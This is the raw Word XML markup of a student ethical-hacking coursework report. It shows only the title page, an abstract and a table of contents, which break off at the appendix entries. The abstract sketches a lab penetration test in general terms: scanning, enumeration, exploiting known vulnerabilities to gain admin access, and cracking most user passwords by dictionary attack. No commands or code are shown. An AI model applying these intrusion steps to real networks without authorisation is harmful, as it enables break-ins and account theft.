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E2A" w:rsidRDefault="009C5438" w:rsidP="00527338">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>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rsidTr="0022030D">
        <w:trPr>
          <w:cantSplit/>
          <w:trHeight w:val="4958"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7283" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w:rsidR="009627B3" w:rsidRDefault="000510C6" w:rsidP="000510C6">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
              <w:t>Ethical hacking</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00FC3B0B" w:rsidRPr="00FC3B0B" w:rsidRDefault="000510C6" w:rsidP="00FC3B0B">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="36"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000510C6">
              <w:rPr>
                <w:b/>
                <w:sz w:val="36"/>
              </w:rPr>
              <w:t>Penetration testing</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0022030D" w:rsidRPr="009627B3" w:rsidRDefault="000510C6" w:rsidP="009627B3">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="40"/>
              </w:rPr>
              <w:t>By Connor Duncan</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="000510C6" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>CMP 201</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="009627B3" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>BSc Ethical Hacking</w:t>
            </w:r>
            <w:r w:rsidR="0022030D" w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve"> Year </w:t>
            </w:r>
            <w:r w:rsidR="000510C6">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0022030D" w:rsidRDefault="000510C6" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>2016/17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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22030D" w:rsidRDefault="0022030D"/>
    <w:p w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w:rsidR="009627B3" w:rsidRDefault="009627B3"/>
    <w:p w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="0022030D">
      <w:pPr>
        <w:framePr w:hSpace="180" w:wrap="around" w:vAnchor="page" w:hAnchor="margin" w:xAlign="center" w:y="7553"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p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rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="0022030D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FF69A5" w:rsidRPr="00CA5897" w:rsidRDefault="00974F37" w:rsidP="003363BE">
      <w:pPr>
        <w:pStyle w:val="Abtracttitle"/>
        <w:rPr>
          <w:sz w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00974F37">
        <w:t>Abstract</w:t>
      </w:r>
      <w:r w:rsidR="009627B3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FC3B0B" w:rsidRDefault="00692399">
      <w:r>
        <w:t>This report covers how to exploit and break into a network, when only given some</w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t xml:space="preserve"> test credentials, and some IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> addresses.</w:t>
      </w:r>
      <w:r w:rsidR="00FC3B0B">
        <w:t xml:space="preserve"> The aim is to find as </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00FC3B0B">
        <w:t>many different ways</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00FC3B0B">
        <w:t xml:space="preserve"> as possible to break into the network, when only given 20 hours of time to gather information, find vulnerabilities, and exploit the system. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FC3B0B" w:rsidRDefault="00FC3B0B">
      <w:r>
        <w:t>The first steps taken were to scan the network and gather as much information as possible, with the intention of later using the information found against the system. Information that was being looked for were things such as open ports, and usernames on the network. After this stage, vulnerability scanning took place to find any known vulnerabilities in the network. Once known vulnerabilities were found, the system hacking stage begin to try and exploit these weaknesses in the network. After successfully gaining access to an admin account, the next aim was to try and gain access to as many accounts as possible, by attempting to crack other user’s passwords, by performing dictionary attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00977C19" w:rsidRDefault="00FC3B0B">
      <w:r>
        <w:t xml:space="preserve">It was found that the network had many vulnerabilities that could easily be exploited. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>The majority of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the passwords were successfully cracked, and access to admin and users accounts was granted by the system. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C6BF5" w:rsidRDefault="004C6BF5"/>
    <w:p w:rsidR="00AD59AD" w:rsidRDefault="00AD59AD"/>
    <w:p w:rsidR="00AD59AD" w:rsidRDefault="00AD59AD"/>
    <w:p w:rsidR="00833EA1" w:rsidRDefault="00833EA1"/>
    <w:p w:rsidR="00833EA1" w:rsidRDefault="00833EA1"/>
    <w:p w:rsidR="00974F37" w:rsidRDefault="00974F37"/>
    <w:p w:rsidR="00FF69A5" w:rsidRDefault="00FF69A5" w:rsidP="00974F37"/>
    <w:p w:rsidR="008A58E3" w:rsidRDefault="00527338" w:rsidP="00712DC9">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:id w:val="-265923424"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w:rsidR="00712DC9" w:rsidRPr="00712DC9" w:rsidRDefault="00BA7AE1" w:rsidP="003363BE">
          <w:pPr>
            <w:pStyle w:val="Abtracttitle"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b w:val="0"/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:t>+</w:t>
          </w:r>
          <w:r w:rsidR="00712DC9" w:rsidRPr="00974F37">
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="00404615" w:rsidP="000510C6">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00712DC9">
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc453256695" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc453256695 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="008F27B2" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc453256697" w:history="1">
            <w:r w:rsidR="000510C6">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Aim</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc453256697 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="00BE6E58" w:rsidRPr="00BE6E58" w:rsidRDefault="00BE6E58" w:rsidP="00BE6E58">
          <w:pPr>
            <w:ind w:firstLine="220"/>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">1.2 </w:t>
          </w:r>
          <w:r w:rsidR="00F21F43">
            <w:tab/>
          </w:r>
          <w:r>
            <w:t>Methodology…………………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00F21F43">
            <w:t>…………………………………………………………………………   1</w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="008F27B2">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc453256698" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure</w:t>
            </w:r>
            <w:r w:rsidR="00F21F43">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t xml:space="preserve"> and Results</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00F21F43">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="008F27B2" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc453256699" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00F21F43">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Scanning</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc453256699 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="008F27B2" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc453256700" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00F21F43">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Enumeration</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc453256700 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="00F21F43" w:rsidRDefault="00F21F43" w:rsidP="00F21F43">
          <w:pPr>
            <w:ind w:firstLine="220"/>
          </w:pPr>
          <w:r>
            <w:t>2.3</w:t>
          </w:r>
          <w:r>
            <w:tab/>
            <w:t xml:space="preserve">   Vulnerability Scanning………………………………………………………………………………………………………………7</w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="00F21F43" w:rsidRDefault="00F21F43" w:rsidP="00F21F43">
          <w:pPr>
            <w:ind w:firstLine="220"/>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">2.4 </w:t>
          </w:r>
          <w:r>
            <w:tab/>
            <w:t xml:space="preserve">   System Hacking…………………………………………………………………………………………………………………………8</w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="00F21F43" w:rsidRPr="00F21F43" w:rsidRDefault="00F21F43" w:rsidP="00F21F43">
          <w:pPr>
            <w:ind w:firstLine="220"/>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">2.5 </w:t>
          </w:r>
          <w:r>
            <w:tab/>
            <w:t>Password Cracking…………………………………………………………………………………………………………………….12</w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="008F27B2">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc453256701" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00F21F43">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Discussion</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00E076AA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="008F27B2" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc453256702" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>3.1</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00F21F43">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>General Discussion</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00E076AA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="00F21F43" w:rsidRDefault="00F21F43" w:rsidP="00F21F43">
          <w:r>
            <w:t xml:space="preserve">    </w:t>
          </w:r>
          <w:r w:rsidR="00E076AA">
            <w:t xml:space="preserve"> </w:t>
          </w:r>
          <w:r>
            <w:t xml:space="preserve">3.2 </w:t>
          </w:r>
          <w:r>
            <w:tab/>
            <w:t xml:space="preserve">   Further Vulnerabilities……………………………………………………………………………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00E076AA">
            <w:t>13</w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="00E076AA" w:rsidRDefault="00E076AA" w:rsidP="00E076AA">
          <w:r>
            <w:t xml:space="preserve">     3.3</w:t>
          </w:r>
          <w:r w:rsidR="00132909">
            <w:tab/>
            <w:t xml:space="preserve">   Counter</w:t>
          </w:r>
          <w:r>
            <w:t xml:space="preserve"> measures……………………………………………………………………………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00132909">
            <w:t xml:space="preserve">…... </w:t>
          </w:r>
          <w:r>
            <w:t xml:space="preserve">13 </w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRPr="00E076AA" w:rsidRDefault="00E076AA" w:rsidP="00E076AA">
          <w:r>
            <w:t xml:space="preserve">4 </w:t>
          </w:r>
          <w:r w:rsidR="00132909">
            <w:t xml:space="preserve">      </w:t>
          </w:r>
          <w:hyperlink w:anchor="_Toc453256709" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
            <w:r w:rsidR="00132909">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>…………………………………………………………………………………………………………………………</w:t>
            </w:r>
            <w:r w:rsidR="00132909">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>………….14</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">5       </w:t>
          </w:r>
          <w:hyperlink w:anchor="_Toc453256710" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendices</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="00132909" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">     </w:t>
          </w:r>
          <w:hyperlink w:anchor="_Toc453256711" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix A</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="00132909" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">     </w:t>
          </w:r>
          <w:hyperlink w:anchor="_Toc453256712" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
